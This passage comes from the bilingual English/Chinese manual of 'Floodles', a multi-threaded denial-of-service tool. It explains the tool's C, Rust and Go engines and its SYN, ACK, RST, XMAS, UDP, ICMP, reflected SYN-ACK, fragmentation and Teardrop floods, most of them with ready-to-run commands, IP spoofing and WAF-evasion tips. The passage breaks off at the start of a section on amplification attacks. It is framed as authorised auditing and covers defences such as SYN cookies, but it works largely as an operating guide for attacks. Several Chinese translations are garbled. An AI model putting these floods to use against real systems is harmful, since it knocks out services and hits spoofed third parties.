for (int i = 0; i < 256; i++) sendto(sock, pkt[i], len, 0, ...);  // 256 syscalls

// Floodles does:
sendmmsg(sock, msgs, BATCH_SIZE, 0);  // 1 syscall for 256 packets
```

Each thread maintains its own raw socket and its own `BATCH_SIZE`-slot array of packet buffers, populated with freshly-crafted packets before each `sendmmsg()` call. The sender supports up to `MAX_THREADS = 64` concurrent threads.
每个线程维护自己的原始套接字和自己的 `BATCH_SIZE` 数据包缓冲区插槽数组，在每次 `sendmmsg()` 调用之前填充新制作的数据包。发送方最多支持 `MAX_THREADS = 64` 个并发线程。

PPS gains over `sendto()` by batch size (measured, 1 thread, SYN packets):
PPS 按批量大小增加超过 `sendto()`（测量，1 个线程，SYN 数据包）：

| Batch size | PPS |
| 批量大小 | 聚苯硫醚 |
|------------|-----|
| 1 (sendto) | ~85,000 |
| 1（发送至） | 〜85,000 |
| 32 | ~310,000 |
| 32 | 〜310,000 |
| 128 | ~710,000 |
| 128 | 〜710,000 |
| **256** | **~820,000** |
| 512 | ~830,000 (diminishing returns) |
| 第512章 | ~830,000（收益递减） |

256 is the optimal batch size: 10x over single `sendto()`, minimal additional gain beyond that point.
256 是最佳批量大小：是单个 `sendto()` 的 10 倍，超出该点的额外增益最小。

#### Rust — Packet Builder (`native/rust/src/lib.rs`)
#### Rust — 数据包生成器 (`native/rust/src/lib.rs`)

Packet construction involves two operations: filling header fields (IP addresses, ports, flags, sequence numbers) and computing checksums (IP and TCP use RFC 1071 16-bit one's complement sum).
数据包构造涉及两个操作：填充标头字段（IP 地址、端口、标志、序列号）和计算校验和（IP 和 TCP 使用 RFC 1071 16 位补码和）。

The Rust builder allocates each packet on the stack — no `malloc()`, no `free()`, no heap fragmentation:
Rust 构建器在堆栈上分配每个数据包 — 无 `malloc()`、无 `free()`、无堆碎片：

```rust
// native/rust/src/lib.rs
const MAX_PKT: usize = 1500;

pub struct PacketBuf {
    pub data: [u8; MAX_PKT],  // Exactly 1500 bytes, stack-allocated
    pub len:  u32,
}
```

The RFC 1071 checksum is a sum of 16-bit words. With `-O3 -march=native` (cargo's release profile), the Rust compiler auto-vectorizes this loop into SIMD instructions (SSE2 on any x86-64, AVX2 where available), computing 8-16 words per clock cycle instead of 1.
RFC 1071 校验和是 16 位字的总和。通过 `-O3 -march=native` （cargo 的发布配置文件），Rust 编译器会自动将此循环向量化为 SIMD 指令（任何 x86-64 上的 SSE2，可用的 AVX2），每个时钟周期计算 8-16 个字，而不是 1 个。

Memory safety is enforced at compile time. Unlike C, buffer overflows in the packet builder are impossible — the bounds checker catches them before the binary is produced.
内存安全是在编译时强制执行的。与 C 不同，数据包构建器中的缓冲区溢出是不可能的——边界检查器在生成二进制文件之前捕获它们。

#### Go — HTTP and Slowloris Engine (`native/go/engine.go`)
#### Go — HTTP 和 Slowloris 引擎 (`native/go/engine.go`)

Go goroutines have a 2 KB initial stack (vs 8 MB for a POSIX thread). The scheduler multiplexes goroutines over a pool of OS threads (M:N model). You can run 100,000 goroutines on a 4-core machine without issue.
Go goroutine 有 2 KB 的初始堆栈（POSIX 线程为 8 MB）。调度程序在操作系统线程池上多路复用 goroutine（M:N 模型）。您可以在 4 核机器上运行 100,000 个 goroutine，不会出现任何问题。

Floodles uses goroutines to maintain thousands of concurrent HTTP connections from a single host:
Floodles 使用 goroutine 维护来自单个主机的数千个并发 HTTP 连接：

```go
// native/go/engine.go — one goroutine per concurrent connection
for i := 0; i < concurrency; i++ {
    go func() {
        for running {
            resp, err := client.Do(req)
            // metrics.requests.Add(1)
            // ...
        }
    }()
}
```

The engine also rotates User-Agent strings per request across a pool of real browser UAs (Chrome, Firefox, Safari, mobile, curl) to avoid trivial pattern matching by WAFs.
该引擎还会根据请求在真实浏览器 UA（Chrome、Firefox、Safari、mobile、curl）池中轮换用户代理字符串，以避免 WAF 进行简单的模式匹配。

Python's `aiohttp` plateaus at 2,000-5,000 effective coroutines due to GIL contention in the event loop's I/O multiplexing layer. The Go engine reaches 50,000-100,000 concurrent connections at equivalent memory.
由于事件循环 I/O 复用层中的 GIL 争用，Python 的 `aiohttp` 稳定在 2,000-5,000 个有效协程。 Go 引擎在同等内存下达到 50,000-100,000 个并发连接。

---

### 3.3 Why Multiple Languages
### 3.3 为什么选择多种语言

| Language | Role | Why |
| 语言 | 角色 | 为什么 |
|----------|------|-----|
| C | Raw sender (`sendmmsg`) | Direct Linux syscall access, zero abstraction overhead, full control over socket buffers |
| C | 原始发件人 (`sendmmsg`) | 直接 Linux 系统调用访问、零抽象开销、完全控制套接字缓冲区 |
| Rust | Packet builder | C-equivalent performance, stack allocation, SIMD-friendly, memory safety enforced at compile time |
| 锈 | 数据包生成器 | C 等效性能、堆栈分配、SIMD 友好、编译时强制执行内存安全 |
| Go | HTTP/Slowloris engine | M:N goroutines, production-grade `net/http`, no GIL, 100k+ concurrent connections from one process |
| 去 | HTTP/Slowloris 引擎 | M:N goroutine，生产级 `net/http`，无 GIL，来自一个进程的 100k+ 并发连接 |
| Python | Orchestration layer | CLI (Click), TUI dashboard (Rich), YAML config, logging (JSONL), backend bridging (ctypes/subprocess) |
| Python | 编排层 | CLI（单击）、TUI 仪表板（丰富）、YAML 配置、日志记录 (JSONL)、后端桥接（ctypes/子进程） |

Python orchestrates everything. C and Rust are loaded as shared libraries via `ctypes`. The Go engine runs as a subprocess managed via `subprocess.Popen`. The Python fallback (Scapy) is always available and requires no compilation.
Python 协调一切。 C 和 Rust 通过 `ctypes` 作为共享库加载。 Go 引擎作为通过 `subprocess.Popen` 管理的子进程运行。 Python 后备 (Scapy) 始终可用且无需编译。

---

## 4. Layer 3/4 Modules — Network and Transport
## 4.第3/4层模块——网络和传输

### 4.1 SYN Flood (UFOSYN)
### 4.1 SYN 泛洪（UFOSYN）

#### Detailed Mechanism
#### 详细机制

During the TCP handshake, when a server receives a SYN packet, the kernel must:
在 TCP 握手期间，当服务器收到 SYN 数据包时，内核必须：

1. Allocate a **TCB** (~300 bytes of kernel memory) for the half-open connection
1. 为半开连接分配 **TCB** （约 300 字节的内核内存）
2. Place the entry in the **SYN queue** (limited by `tcp_max_syn_backlog`)
2. 将条目放入 **SYN queue**（受 `tcp_max_syn_backlog` 限制）
3. Send a SYN-ACK to the source IP
3. 向源 IP 发送 SYN-ACK
4. Start a retransmission timer (default: 3 retransmits over ~75 seconds)
4. 启动重传计时器（默认值：约 75 秒内重传 3 次）

With IP spoofing, the SYN-ACK goes to a random IP that never sent anything. No ACK comes back. The TCB sits in `SYN_RECEIVED` state for ~75 seconds consuming memory and a SYN queue slot. Flood fast enough and the queue fills.
通过 IP 源地址伪造，SYN-ACK 会发送到一个从未发送过任何内容的随机 IP。没有返回 ACK。 TCB 处于 `SYN_RECEIVED` 状态约 75 秒，消耗内存和 SYN 队列槽。泛洪足够快，队列就满了。

```
SYN queue at capacity:
  New SYN arrives -> queue full -> DROPPED
  -> Legitimate clients get ECONNREFUSED or connection timeout
```

The attack sends packets with random source IPs using `fast_rand()` (xorshift64, ~3 cycles/call). At 2M PPS on 8 threads, the SYN queue of any standard server saturates within milliseconds.
该攻击使用 `fast_rand()`（xorshift64，~3 个周期/调用）发送具有随机源 IP 的数据包。在 8 个线程上的 2M PPS 下，任何标准服务器的 SYN 队列都会在几毫秒内饱和。

#### SYN Cookies — The Primary Countermeasure
#### SYN Cookie——主要对策

`net.ipv4.tcp_syncookies=1` fundamentally changes the server's strategy. Instead of allocating a TCB, the server encodes the connection state into the SYN-ACK's sequence number: a cryptographic hash of the 4-tuple (src\_ip, src\_port, dst\_ip, dst\_port) combined with a timestamp.
`net.ipv4.tcp_syncookies=1` 从根本上改变了服务器的策略。服务器不分配 TCB，而是将连接状态编码为 SYN-ACK 的序列号：4 元组（src\_ip、src\_port、dst\_ip、dst\_port）与时间戳相结合的加密哈希。

No TCB is allocated. No SYN queue slot is used. When the ACK arrives, the server recomputes the hash and reconstructs state from it. The flood costs the server only the CPU time to send SYN-ACKs — memory is never touched.
没有分配 TCB。不使用 SYN 队列槽。当 ACK 到达时，服务器重新计算哈希并从中重建状态。泛洪仅花费服务器发送 SYN-ACK 的 CPU 时间——内存从未被触及。

```bash
# Verify SYN cookies on target (SSH access required)
sysctl net.ipv4.tcp_syncookies
# 1 = enabled -> SYN flood largely ineffective
# 0 = disabled -> vulnerable

sysctl net.ipv4.tcp_max_syn_backlog
# Typical values: 128 (minimal) to 4096 (hardened)
```

Residual effect with SYN cookies: the server still sends a SYN-ACK per SYN, consuming CPU and outbound bandwidth. At very high PPS (>500k sustained), even a SYN-cookie-enabled server may saturate its CPU on SYN-ACK generation or its uplink on SYN-ACK traffic. This is the point of testing.
SYN cookie 的残留影响：服务器仍然为每个 SYN 发送一个 SYN-ACK，消耗 CPU 和出站带宽。在非常高的 PPS（>500k 持续）下，即使启用了 SYN-cookie 的服务器也可能在 SYN-ACK 生成上使其 CPU 饱和，或者在 SYN-ACK 流量上使其上行链路饱和。这就是测试的重点。

#### Audit Use
#### 审计使用

```bash
# Tier 1 — probe (verify SYN cookies are active without causing impact)
sudo floodles syn 192.168.1.100 80 -t 2 --pps 5000 -d 30

# Tier 2 — pressure (observe latency increase)
sudo floodles syn 192.168.1.100 80 -t 4 --pps 30000 -d 60

# Tier 3 — saturation threshold
sudo floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60

# Full load (record degradation point)
sudo floodles syn 192.168.1.100 80 -t 16 -d 60
```

Monitor on the target:
监控目标：

```bash
# SYN queue fill
watch -n1 'ss -s'
# SYN-RECV count rising -> queue filling -> SYN cookies may not be active

# Packets dropped because backlog was full
netstat -s | grep "SYNs to LISTEN"

# Test connectivity from a separate host during the flood
curl --connect-timeout 5 http://192.168.1.100/
```

---

### 4.2 ACK Flood (UFOACK)
### 4.2 ACK洪泛（UFOACK）

#### Detailed Mechanism
#### 详细机制

A TCP ACK packet is valid only within an established connection. When a spoofed ACK with a random sequence number arrives at a server:
TCP ACK 数据包仅在已建立的连接内有效。当带有随机序列号的源地址伪造的 ACK 到达服务器时：

1. The kernel walks the TCP connection state table, looking for a matching 4-tuple
1. 内核遍历 TCP 连接状态表，寻找匹配的 4 元组
2. It finds no matching established connection
2. 它找不到匹配的已建立连接
3. It sends an RST toward the (spoofed) source IP and discards the packet
3. 它向（源地址伪造的）源 IP 发送 RST 并丢弃数据包

The cost per packet is a hash table lookup in the kernel's connection tracking structure. On a busy server with many established connections, this lookup is O(1) average but generates measurable CPU overhead at high PPS. The RSTs are sent to random IPs — the attacker's real IP is never involved.
每个数据包的成本是内核连接跟踪结构中的哈希表查找。在具有许多已建立连接的繁忙服务器上，此查找的平均时间为 O(1)，但会在高 PPS 下产生可测量的 CPU 开销。 RST 被发送到随机 IP——攻击者的真实 IP 永远不会被涉及。

#### Primary Audit Value — Testing Firewall Statefulness
#### 主要审计价值——测试防火墙状态

The real purpose of an ACK flood is not to exhaust the server — it is to reveal whether the firewall in front of the server is **stateful** (connection tracking) or **stateless** (simple rule matching).
ACK 泛洪的真正目的不是耗尽服务器，而是揭示服务器前面的防火墙是 **stateful** （连接跟踪）还是 **stateless** （简单规则匹配）。

```
STATELESS firewall — rule: "allow TCP inbound to port 80"
  ACK packet arrives -> flags=ACK, dst=80 -> rule matches -> PASS
  -> Server receives the ACK -> processes it -> sends RST
  -> ACK flood successfully reaches the server

STATEFUL firewall — conntrack enabled
  ACK packet arrives -> conntrack looks for (src, dst, sport, dport) in table
  -> No matching established connection -> DROP
  -> Server never sees the packet -> ACK flood has zero impact
```

```bash
# Launch ACK flood
sudo floodles ack 192.168.1.100 80 -t 4 --pps 10000 -d 30

# On the server: are RSTs being generated? (means ACKs are passing through)
tcpdump -i eth0 'tcp[tcpflags] & tcp-rst != 0' -n -c 100
# RSTs appearing -> stateless firewall -> finding to report

# iptables conntrack counters
watch -n1 'iptables -n -v -L | grep -E "RELATED|ESTABLISHED"'
```

---

### 4.3 RST/FIN Flood (UFORST)
### 4.3 RST/FIN 洪泛（UFORST）

#### Detailed Mechanism
#### 详细机制

An RST packet tells the receiving kernel: "close this connection immediately." Normally, RST is only valid for a specific connection. But with a forged RST, the receiver checks if the sequence number falls within the **receive window** of any active connection.
RST 数据包告诉接收内核：“立即关闭此连接。”通常，RST仅对特定连接有效。但对于伪造的 RST，接收器会检查序列号是否落在任何活动连接的 **receive window** 内。

The probability per RST packet that it hits the sequence window of an active connection:
每个 RST 数据包命中活动连接的序列窗口的概率：

```
TCP sequence space: 2^32 = 4,294,967,296 values
Typical receive window: 65,535 bytes
Hit probability per packet: 65,535 / 4,294,967,296 = 0.0015%

At 1,000,000 RST/sec:
Expected hits = 1,000,000 x 0.0015% = ~15 active connections killed/second
```

Over a 60-second flood, this terminates approximately 900 established connections. Against a server with persistent long-lived connections (SSH sessions, database connections, WebSocket, VPN tunnels), this is a meaningful disruption. Connection recovery adds overhead — reconnection storms can degrade the application further.
在 60 秒的泛洪中，这将终止大约 900 个已建立的连接。对于具有持久长期连接（SSH 会话、数据库连接、WebSocket、VPN 隧道）的服务器来说，这是一个有意义的中断。 Connection recovery adds overhead — reconnection storms can degrade the application further.

#### Targeted Variant
#### 目标变体

If the attacker has sniffed or inferred the exact sequence number of a specific connection (e.g., a BGP session between two routers), a single crafted RST can cut that connection with 100% certainty. This is precisely what BGP RST injection attacks do. CVE-2004-0230 documents this against BGP peering sessions: a single RST with the correct sequence number drops the peering, causing BGP route table flushes and potentially black-holing traffic.
如果攻击者嗅探或推断出特定连接（例如，两个路由器之间的 BGP 会话）的确切序列号，则单个精心设计的 RST 可以 100% 确定地切断该连接。这正是 BGP RST 注入攻击的作用。 CVE-2004-0230 针对 BGP 对等会话记录了这一点：具有正确序列号的单个 RST 会丢弃对等互连，从而导致 BGP 路由表刷新并可能产生黑洞流量。

```bash
# Random RST flood (probabilistic connection termination)
sudo floodles rst 192.168.1.100 22 --flag R -t 4 -d 60

# FIN flood (graceful close attempt — less disruptive, useful for testing)
sudo floodles rst 192.168.1.100 22 --flag F -t 4 -d 60

# Combined RST+FIN
sudo floodles rst 192.168.1.100 22 --flag RF -t 4 -d 60
```

---

### 4.4 XMAS Flood
### 4.4 XMAS 泛洪

#### Detailed Mechanism
#### 详细机制

RFC 793 defines a finite state machine for TCP flag handling. Certain flag combinations are logical impossibilities: you cannot simultaneously initiate a connection (SYN), terminate it (FIN), and reset it (RST). An XMAS packet sets **all eight flag bits** simultaneously (0xFF): FIN+SYN+RST+PSH+ACK+URG+ECE+CWR.
RFC 793 定义了用于 TCP 标志处理的有限状态机。某些标志组合在逻辑上是不可能的：您不能同时启动连接 (SYN)、终止连接 (FIN) 和重置连接 (RST)。 XMAS 数据包同时设置 **all eight flag bits** (0xFF)：FIN+SYN+RST+PSH+ACK+URG+ECE+CWR。

RFC 793 does not specify behavior for such packets. Each OS implementation decides:
RFC 793 没有指定此类数据包的行为。每个操作系统的实现决定：

| OS / Stack | Response to XMAS packet on open port | Response on closed port |
| 操作系统/堆栈 | 对开放端口上的 XMAS 数据包的响应 | 关闭端口的响应 |
|-----------|--------------------------------------|------------------------|
| Linux (modern) | No response (silently drops) | RST |
| Linux（现代） | 没有反应（默默滴） | 快速恢复时间 |
| Windows | No response | No response |
| 视窗 | 没有回应 | 没有回应 |
| BSD | RST | RST |
| BSD | 快速恢复时间 | 快速恢复时间 |
| Embedded / custom stacks | Undefined — may crash, reboot, or respond incorrectly |
| 嵌入式/自定义堆栈 | 未定义 — 可能会崩溃、重新启动或响应不正确 |

This variation makes XMAS packets useful for OS fingerprinting and, on legacy embedded equipment, potentially for triggering software faults.
这种变化使得 XMAS 数据包可用于操作系统指纹识别，并且在传统嵌入式设备上可能用于触发软件故障。

#### Primary Audit Value — IDS Detection Testing
#### 主要审核值 — IDS 检测测试

XMAS is one of the most distinctive packet signatures. Any mature IDS (Snort, Suricata, Zeek) has rules for it:
XMAS 是最独特的数据包签名之一。任何成熟的 IDS（Snort、Suricata、Zeek）都有其规则：

```bash
# Launch XMAS flood
sudo floodles xmas 192.168.1.100 80 -t 4 --pps 1000 -d 30

# Did the IDS alert? Check your SIEM or Suricata logs:
tail -f /var/log/suricata/fast.log | grep -i xmas

# Typical Snort/Suricata rule:
# alert tcp any any -> any any (flags:SFRPAUEC; msg:"TCP XMAS Scan"; sid:1000001; rev:1;)

# If no alert after 30 seconds of XMAS traffic -> IDS misconfigured or rule not loaded
```

#### Port Scanning Usage (nmap -sX)
#### 端口扫描用法 (nmap -sX)

XMAS is also a port scanning technique. On an **open port**, the server (per RFC) ignores the packet — no RST. On a **closed port**, it sends RST. This lets you infer open ports without sending SYN packets:
XMAS也是一种端口扫描技术。在 **open port** 上，服务器（根据 RFC）忽略数据包 — 无 RST。在 **closed port** 上，它发送 RST。这使您可以在不发送 SYN 数据包的情况下推断开放端口：

```bash
nmap -sX 192.168.1.100
# No response -> port open (or filtered)
# RST -> port closed
```

---

### 4.5 UDP Flood (UFOUDP)
### 4.5 UDP 洪泛（UFOUDP）

#### Detailed Mechanism
#### 详细机制

For each incoming UDP datagram:
对于每个传入的 UDP 数据报：
- **Port open**: datagram queued in socket receive buffer, delivered to application
- **Port open**：数据报在套接字接收缓冲区中排队，传递给应用程序
- **Port closed**: kernel generates ICMP Port Unreachable (type 3, code 3) toward the source IP
- **Port closed**：内核生成针对源 IP 的 ICMP 端口无法到达（类型 3，代码 3）

With IP spoofing, these ICMP responses go to random IPs — the attacker's link is not loaded by return traffic. But the server's outbound interface generates ICMP for every closed-port UDP packet it receives, potentially saturating its own upbound link with ICMP traffic it is generating.
通过 IP 源地址伪造，这些 ICMP 响应会发送到随机 IP — 攻击者的链接不会被返回流量加载。但服务器的出站接口会为其收到的每个关闭端口 UDP 数据包生成 ICMP，这可能会导致其生成的 ICMP 流量使其自身的上行链路饱和。

Linux rate-limits ICMP responses by default (`net.ipv4.icmp_ratelimit`), which partially mitigates this self-saturation. But the kernel still processes each incoming UDP datagram, consuming CPU.
Linux 默认情况下对 ICMP 响应进行速率限制 (`net.ipv4.icmp_ratelimit`)，这部分缓解了这种自饱和现象。但内核仍然处理每个传入的 UDP 数据报，从而消耗 CPU。

#### Payload Size Strategy
#### 有效负载大小策略

```
Small UDP payload (64 bytes):
  -> More packets per second for same bandwidth
  -> More kernel processing operations per second
  -> More ICMP Port Unreachable messages generated
  -> CPU saturation target

Near-MTU payload (1400 bytes):
  -> Fewer PPS but more Mbps
  -> Stays within Ethernet MTU (no fragmentation)
  -> Bandwidth saturation target
  -> Effective against links with bandwidth caps
```

```bash
# CPU saturation mode (small packets, high PPS)
sudo floodles udp 192.168.1.100 -s 64 -t 8 -d 60

# Bandwidth saturation mode (near-MTU)
sudo floodles udp 192.168.1.100 -s 1400 -t 8 -d 60

# Target specific service (DNS on UDP/53 — directly disrupts the service)
sudo floodles udp 192.168.1.100 -p 53 -s 512 -t 8 -d 60

# Verify kernel ICMP rate limiting on target
sysctl net.ipv4.icmp_ratelimit   # default 1000ms — at most 1 ICMP/second
```

---

### 4.6 ICMP Flood (PINGER)
### 4.6 ICMP 泛洪（PINGER）

#### Detailed Mechanism
#### 详细机制

ICMP echo request (type 8) expects an echo reply (type 0). For each received ping, the kernel must:
ICMP 回显请求（类型 8）需要回显回复（类型 0）。对于每个收到的 ping，内核必须：
1. Validate the ICMP checksum
1. 验证 ICMP 校验和
2. Allocate a reply buffer
2. 分配回复缓冲区
3. Copy the payload
3. 复制有效负载
4. Construct and send the echo reply
4. 构造并发送回显回复

**The bandwidth multiplier**: the attacker sends X bytes/second inbound; the target generates X bytes/second outbound in replies. Total bandwidth consumed = 2X. With IP spoofing, the replies go to random IPs — third parties receive unsolicited ICMP traffic, and the target saturates its own outbound link with replies.
**The bandwidth multiplier**：攻击者每秒发送 X 字节入站；目标在回复中生成 X 字节/秒出站。消耗的总带宽 = 2X。通过 IP 源地址伪造，回复会发送到随机 IP — 第三方收到未经请求的 ICMP 流量，目标会用回复饱和其自己的出站链接。

#### ICMP Rate Limiting
#### ICMP 速率限制

Linux enforces a built-in ICMP response rate limit:
Linux 强制执行内置 ICMP 响应速率限制：

```bash
sysctl net.ipv4.icmp_ratelimit   # default: 1000 (1 response per 1000ms = 1/sec)
sysctl net.ipv4.icmp_ratemask    # which ICMP types are rate-limited
```

With `icmp_ratelimit=1000`, the kernel generates at most 1 ICMP echo reply per second regardless of incoming flood rate. The inbound bandwidth is still consumed (NIC must receive and discard packets), but the outbound saturation loop is broken. An ICMP flood on a properly configured Linux server primarily tests the upstream pipe capacity, not server resources.
使用 `icmp_ratelimit=1000` 时，无论传入的泛洪速率如何，内核每秒最多生成 1 个 ICMP 回显回复。入站带宽仍然被消耗（NIC 必须接收和丢弃数据包），但出站饱和循环已被打破。正确配置的 Linux 服务器上的 ICMP 泛洪主要测试上游管道容量，而不是服务器资源。

```bash
# Standard ICMP flood (56-byte payload, like ping)
sudo floodles icmp 192.168.1.100 -s 56 -t 4 -d 30

# Near-MTU for bandwidth saturation
sudo floodles icmp 192.168.1.100 -s 1400 -t 8 -d 60

# Verify rate limiting on target
sysctl net.ipv4.icmp_ratelimit
# 1000 = 1/sec rate limit (correct)
# 0    = unlimited (vulnerable to reply-storm)
```

---

### 4.7 SYN-ACK Flood (TACHYON)
### 4.7 SYN-ACK 洪泛（TACHYON）

#### Direct Mode
#### 直接模式

Spoofed SYN-ACK packets are sent directly to the target. An unsolicited SYN-ACK triggers an RST in response: the kernel checks its connection table, finds no matching half-open connection, and resets. The cost is the same as an ACK flood: a connection table lookup and RST generation per packet.
源地址伪造的 SYN-ACK 数据包会直接发送到目标。未经请求的 SYN-ACK 会触发 RST 作为响应：内核检查其连接表，发现没有匹配的半开连接，然后重置。其成本与 ACK 泛洪相同：每个数据包进行连接表查找和 RST 生成。

Less effective than SYN flood against a standalone server. More interesting for testing firewalls that pass SYN-ACKs inbound (reasoning: "it looks like a legitimate server response").
与针对独立服务器的 SYN 泛洪相比效果较差。对于测试传入 SYN-ACK 的防火墙来说更有趣（推理：“它看起来像是合法的服务器响应”）。

#### Reflected Mode — Leveraging Real Servers as Sources
#### 反射模式——利用真实服务器作为源

The reflected variant is considerably more sophisticated. Instead of sending SYN-ACKs directly, the attacker sends SYNs with the victim's IP as the spoofed source to legitimate public servers. Those servers send their SYN-ACKs to the victim.
反射的变体要复杂得多。攻击者不是直接发送 SYN-ACK，而是将受害者 IP 作为伪造源地址的 SYN 发送到合法的公共服务器。这些服务器将其 SYN-ACK 发送给受害者。

```
Direct SYN flood (obvious):
  Attacker -> SYN (src=random) -> Victim
  -> Traffic source is random/spoofed IPs

TACHYON reflected (harder to filter):
  Attacker -> SYN (src=victim_ip) -> CDN_server_1
  CDN_server_1 -> SYN-ACK         -> victim_ip  <- Victim receives this

  Attacker -> SYN (src=victim_ip) -> CDN_server_2
  CDN_server_2 -> SYN-ACK         -> victim_ip

  Attacker -> SYN (src=victim_ip) -> CDN_server_3 ... x1000
```

The victim receives SYN-ACKs from real, legitimate servers with good-reputation IPs (CDN nodes, cloud providers, major websites). IP reputation blacklists are useless — every source IP is a legitimate server. The amplification factor is approximately 1x (SYN-ACK is similar in size to SYN), but the traffic's source diversity makes scrubbing extremely costly.
受害者从具有良好信誉 IP 的真实合法服务器（CDN 节点、云提供商、主要网站）接收 SYN-ACK。 IP 信誉黑名单毫无用处——每个源 IP 都是合法服务器。放大系数约为 1 倍（SYN-ACK 的大小与 SYN 类似），但流量的来源多样性使得清理成本极其高昂。

```bash
# Direct SYN-ACK flood
sudo floodles tachyon 192.168.1.100 --port 80 --mode direct -t 8 -d 60

# Reflected (requires a list of real servers as reflectors)
sudo floodles tachyon 192.168.1.100 --mode reflected -r 1.2.3.4,5.6.7.8 --ref-port 80 -d 60
```

---

### 4.8 IP Fragmentation (DROPER)
### 4.8 IP 分片（DROPER）

#### How IP Fragmentation Works
#### IP 分片的工作原理

When a packet exceeds the MTU (1500 bytes on Ethernet), IP splits it into fragments. Each fragment shares a common **Identification** field and carries a **Fragment Offset** indicating its position in the original datagram. The **MF (More Fragments)** flag is set on all fragments except the last.
当数据包超过 MTU（以太网上为 1500 字节）时，IP 会将其拆分为片段。每个片段共享一个公共 **Identification** 字段，并带有一个 **Fragment Offset** 指示其在原始数据报中的位置。除最后一个片段外，所有片段均设置 **MF (More Fragments)** 标志。

The receiver must hold all fragments in a **reassembly buffer** until the complete set arrives, then reconstruct the original packet. Linux maintains these buffers in a hash table (`ipq hash table`), governed by:
接收方必须将所有片段保存在 **reassembly buffer** 中，直到完整的片段到达，然后重建原始数据包。 Linux 在哈希表 (`ipq hash table`) 中维护这些缓冲区，由以下因素控制：

```bash
sysctl net.ipv4.ipfrag_max_dist    # max fragment distance before drop
sysctl net.ipv4.ipfrag_time        # reassembly timeout (default: 30 seconds)
sysctl net.ipv4.ipfrag_high_thresh # max memory for all pending reassemblies
sysctl net.ipv4.ipfrag_low_thresh  # flush threshold
```

#### Standard Flood Variant
#### 标准泛洪变体

Sends thousands of tiny fragments (8 bytes each, minimum valid fragment) with randomized Identification fields. Each unique ID occupies one slot in the reassembly hash table. When the table fills (determined by `ipfrag_high_thresh`, default 4 MB), new fragments and all legitimate fragmented traffic are dropped.
发送数千个带有随机标识字段的小片段（每个 8 字节，最小有效片段）。每个唯一ID在重组哈希表中占据一个槽位。当表填满时（由 `ipfrag_high_thresh` 确定，默认为 4 MB），新分段和所有合法分段流量将被丢弃。

#### Last-Fragment-Only Variant (Most Efficient)
#### 仅最后一个片段的变体（最有效）

Sends only the **last fragment** of a fictitious datagram: `MF=0` (no more fragments), `offset > 0` (not the first). The kernel cannot reassemble without the first fragment, so it allocates a reassembly buffer and waits for `ipfrag_time` (30 seconds) before expiring.
仅发送虚构数据报的 **last fragment**：`MF=0`（不再有片段）、`offset > 0`（不是第一个）。如果没有第一个片段，内核就无法重新组装，因此它会分配一个重组缓冲区并在过期之前等待 `ipfrag_time` （30 秒）。

```
1 last_only fragment -> buffer allocated, held for 30 seconds
1000 last_only packets/second -> 30,000 active buffers simultaneously
-> ipfrag_high_thresh exhausted -> all fragmented traffic dropped for everyone
```

This is a low-PPS, high-sustained-impact attack. 1000 PPS of 8-byte fragments is barely measurable bandwidth (~64 Kbps), yet it can deny all fragmented traffic for the duration.
这是一种低 PPS、高持续影响的攻击。 8 字节片段的 1000 PPS 几乎无法测量带宽（~64 Kbps），但它可以在持续时间内拒绝所有片段流量。

```bash
# Standard fragmentation flood
sudo floodles frag 192.168.1.100 --variant flood -t 4 -d 60

# Last-fragment-only (low bandwidth, sustained impact)
sudo floodles frag 192.168.1.100 --variant last_only -t 2 -d 120

# Monitor reassembly on the target
watch -n1 'grep "Reasm" /proc/net/snmp'
# ReasmFails rising -> reassembly buffer exhausted or fragments dropped
```

---

### 4.9 Fragment Overlap (OVERLAP)
### 4.9 片段重叠（OVERLAP）

#### Teardrop — CVE-1999-0015
#### Teardrop — CVE-1999-0015

Teardrop sends two IP fragments where the second fragment's offset overlaps the first. The reassembly code in vulnerable kernels mishandles this overlap:
Teardrop 发送两个 IP 片段，其中第二个片段的偏移量与第一个片段重叠。易受攻击的内核中的重组代码错误地处理了这种重叠：

```
Fragment 1: offset=0, length=68  (covers bytes 0-67)
Fragment 2: offset=24, length=48 (covers bytes 24-71)
            |<-- overlaps bytes 24-67 of fragment 1

Correct behavior: truncate or discard the overlapping bytes
Vulnerable behavior: integer underflow in memcpy length calculation
  -> memcpy(buf, data, 48 - 44) = memcpy(buf, data, 4)   <- OK
  Crafted variant:
  -> memcpy(buf, data, 8 - 48)  = memcpy(buf, data, -40) <- wraps to huge value
  -> kernel heap corruption -> kernel panic
```

Linux kernels since 2.0.32 (patched 1997), Windows 95/NT patched in 1997-1998. Still found on unpatched embedded devices, industrial controllers, legacy SCADA systems.
Linux 内核自 2.0.32（1997 年修补）以来，Windows 95/NT 在 1997-1998 年修补。仍然存在于未修补的嵌入式设备、工业控制器、传统 SCADA 系统中。

#### Modern Variants
#### 现代变体

| Variant | Description |
| 变体 | 描述 |
|---------|-------------|
| `teardrop` | Classic CVE-1999-0015 overlap |
| `teardrop` | 经典 CVE-1999-0015 重叠 |
| `rose` | Variant targeting different calculation path |
| `rose` | 针对不同计算路径的变体 |
| `tiny` | Very small fragments forcing maximum overlap |
| `tiny` | 非常小的碎片迫使最大的重叠 |

```bash
# Test all variants against legacy equipment
sudo floodles overlap 192.168.1.100 --variant teardrop -t 2 -d 30
sudo floodles overlap 192.168.1.100 --variant rose     -t 2 -d 30
sudo floodles overlap 192.168.1.100 --variant tiny     -t 2 -d 30

# Indicator of success: target becomes unreachable -> kernel panic
ping -c 5 192.168.1.100
# No response after attack -> potential crash
```

---

## 5. Amplification Modules — DRDoS
## 5. 放大模块——DRDoS

### 5.1 Understanding Amplification
### 5.1 理解放大

**Distributed Reflected DoS (DRDoS)** exploits a fundamental property of stateless UDP protocols: a server sends its response to whatever source IP appears in the request — with no way to verify it.
**Distributed Reflected DoS (DRDoS)** 利用无状态 UDP 协议的基本属性：服务器将其响应发送到请求中出现的任何源 IP，而无法验证它。

The attack requires three conditions:
攻击需要三个条件：
1. A protocol that uses UDP and produces large responses to small requests
1. 使用 UDP 并对小请求产生大量响应的协议
2. A server running that protocol with no source filtering (an "open reflector")
2. 运行该协议且没有源过滤的服务器（“开放反射器”）
3. The ability to spoof the source IP in outbound packets
3. 能够源地址伪造出站数据包中的源 IP

When all three are present, the attacker can direct massive traffic toward a victim while consuming only a fraction of the bandwidth:
当这三者都存在时，攻击者可以将大量流量定向到受害者，同时仅消耗一小部分带宽：

```
Attacker bandwidth: 1 Mbps (outbound, to reflectors)
Amplification factor: 500x
Victim bandwidth received: 500 Mbps (inbound, from reflectors)
Attacker's bandwidth consumed: still 1 Mbps

